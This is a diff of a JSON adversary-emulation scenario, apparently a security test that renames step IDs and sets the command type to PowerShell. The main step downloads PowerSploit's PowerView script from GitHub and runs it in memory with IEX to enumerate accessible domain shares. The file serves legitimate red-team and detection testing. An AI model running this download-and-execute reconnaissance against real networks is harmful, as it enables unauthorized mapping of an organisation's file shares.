@@ -7,68 +7,68 @@
   ],
   "steps": [
     {
-      "id": "f86c35c2-9713-4060-bc75-19bfd35edb8c",
+      "id": "54369faf-1d05-4d2e-9e3f-9e3273b34840",
       "type": "execute-command",
       "data": {
-        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose\n",
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose",
         "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "a8a0f0a2-74a0-48a3-ba8a-3a5a513d2b8a",
+      "id": "c90c8da8-6b79-4760-8a9f-2e00048ca96d",
       "name": "Check dependency 1/1",
       "description": "Endpoint must be joined to domain\n",
       "type": "execute-command",
       "data": {
-        "command": "if ((Get-WmiObject -Class Win32_ComputerSystem).PartofDomain) {exit 0} else {exit 1}\n",
-        "command_type": ""
+        "command": "if ((Get-WmiObject -Class Win32_ComputerSystem).PartofDomain) {exit 0} else {exit 1}",
+        "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "3661c2d8-99be-4500-909a-4ed2814303cc",
+      "id": "92f755c5-7f01-4afd-b581-91262261a87e",
       "name": "Resolve dependency 1/1",
       "description": "Endpoint must be joined to domain\n",
       "type": "execute-command",
       "data": {
-        "command": "\"Join system to domain\"\n",
-        "command_type": ""
+        "command": "\"Join system to domain\"",
+        "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "52ce154a-ec9b-46b7-9f36-e3f1baa92128",
+      "id": "3b73eaf0-809d-4768-8de1-0852993df5fa",
       "name": "Re-check dependency 1/1",
       "description": "Endpoint must be joined to domain\n",
       "type": "execute-command",
       "data": {
-        "command": "if ((Get-WmiObject -Class Win32_ComputerSystem).PartofDomain) {exit 0} else {exit 1}\n",
-        "command_type": ""
+        "command": "if ((Get-WmiObject -Class Win32_ComputerSystem).PartofDomain) {exit 0} else {exit 1}",
+        "command_type": "powershell"
       },
       "elevation_required": false
     }
   ],
   "flows": [
     {
-      "s": "a8a0f0a2-74a0-48a3-ba8a-3a5a513d2b8a",
+      "s": "c90c8da8-6b79-4760-8a9f-2e00048ca96d",
       "p": "on-success",
-      "o": "f86c35c2-9713-4060-bc75-19bfd35edb8c"
+      "o": "54369faf-1d05-4d2e-9e3f-9e3273b34840"
     },
     {
-      "s": "a8a0f0a2-74a0-48a3-ba8a-3a5a513d2b8a",
+      "s": "c90c8da8-6b79-4760-8a9f-2e00048ca96d",
       "p": "on-failure",
-      "o": "3661c2d8-99be-4500-909a-4ed2814303cc"
+      "o": "92f755c5-7f01-4afd-b581-91262261a87e"
     },
     {
-      "s": "3661c2d8-99be-4500-909a-4ed2814303cc",
+      "s": "92f755c5-7f01-4afd-b581-91262261a87e",
       "p": "on-success",
-      "o": "52ce154a-ec9b-46b7-9f36-e3f1baa92128"
+      "o": "3b73eaf0-809d-4768-8de1-0852993df5fa"
     },
     {
-      "s": "52ce154a-ec9b-46b7-9f36-e3f1baa92128",
+      "s": "3b73eaf0-809d-4768-8de1-0852993df5fa",
       "p": "on-failure",
-      "o": "f86c35c2-9713-4060-bc75-19bfd35edb8c"
+      "o": "54369faf-1d05-4d2e-9e3f-9e3273b34840"
     }
   ],
   "tags": [
